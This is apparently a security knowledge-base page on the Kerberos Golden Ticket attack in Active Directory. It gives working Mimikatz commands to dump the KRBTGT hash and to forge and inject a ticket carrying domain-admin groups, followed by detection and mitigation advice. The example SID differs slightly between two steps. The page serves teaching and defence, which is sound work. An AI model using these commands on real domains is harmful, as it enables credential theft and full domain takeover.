+++
title = "Golden Ticket"
author = ["svejk"]
tags = ["activeDirectory", "kerberos"]
draft = false
+++

## Golden Ticket {#golden-ticket}

A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the KRBTGT account’s NTLM hash. Once created, it can be used to impersonate any user in the domain, including domain admins, and grants unlimited access to services in the domain.


### Overview {#overview}

-   Forged TGT signed with the KRBTGT hash
-   Bypasses domain authentication controls
-   Can impersonate any user in the domain


### Prerequisites {#prerequisites}

-   SYSTEM or Domain Admin privileges on a domain-joined machine
-   Access to the NTLM hash of the KRBTGT account
-   Knowledge of:
    -   Domain SID
    -   Domain name
    -   (Optional) actual usernames


### Key Concepts {#key-concepts}

-   **KRBTGT account**: Used by KDC to sign/encrypt TGTs
-   **SID**: Used to tie forged ticket to domain
-   **TGT**: Ticket Granting Ticket (used to request service tickets)


### Mimikatz Commands {#mimikatz-commands}


#### Dump KRBTGT Hash {#dump-krbtgt-hash}

```powershell
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
```

Look for:
Hash NTLM: a2c0b1f65a098dc5b3e3479e9d88cb5e


#### Get Domain SID {#get-domain-sid}

```powershell
whoami /user
```

Use everything before the last \`-\` as the domain SID:
S-1-5-21-1234567890-2345678901-345678901


#### Create and Inject Golden Ticket {#create-and-inject-golden-ticket}

```powershell
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-2345678901-3456789012 /krbtgt:a2c0b1f65a098dc5b3e3479e9d88cb5e /id:500 /groups:512,513,518,519 /ptt
```

Explanation:

-   \`/user\`: Target username (can be fake)
-   \`/domain\`: Target domain
-   \`/sid\`: Domain SID
-   \`/krbtgt\`: Hash from lsadump
-   \`/id=500\`: RID of user (500 = built-in Administrator)
-   \`/groups\`: Common group SIDs:
    -   512 – Domain Admins
    -   513 – Domain Users
    -   518 – Schema Admins
    -   519 – Enterprise Admins
-   \`/ptt\`: Pass-the-ticket (inject directly into memory)


#### Validate Ticket {#validate-ticket}

```powershell
whoami
whoami /groups
klist
```


### Impact {#impact}

-   TGTs can be valid for years (custom expiration)
-   Allows full domain persistence and stealthy lateral movement
-   Tickets are trusted by all Kerberos-enabled services


### Detection {#detection}

-   Look for TGTs without preceding AS-REQ (Event ID 4768 missing)
-   Unusual ticket lifetimes (e.g. 10-year validity)
-   Logins from accounts that don’t exist
-   Event ID 4769 anomalies


### Mitigation {#mitigation}

-   Reset KRBTGT password twice
-   Rotate domain admin credentials regularly
-   Monitor use of high-privilege accounts
-   Implement tiered access (admin tiers)
-   Use Protected Users group and managed service accounts


### References {#references}

-   <https://adsecurity.org/?p=1515>
-   <https://www.harmj0y.net/blog/redteaming/kerberos-attacks-part-1/>
-   <https://learn.microsoft.com/en-us/windows-server/security/kerberos/golden-ticket>
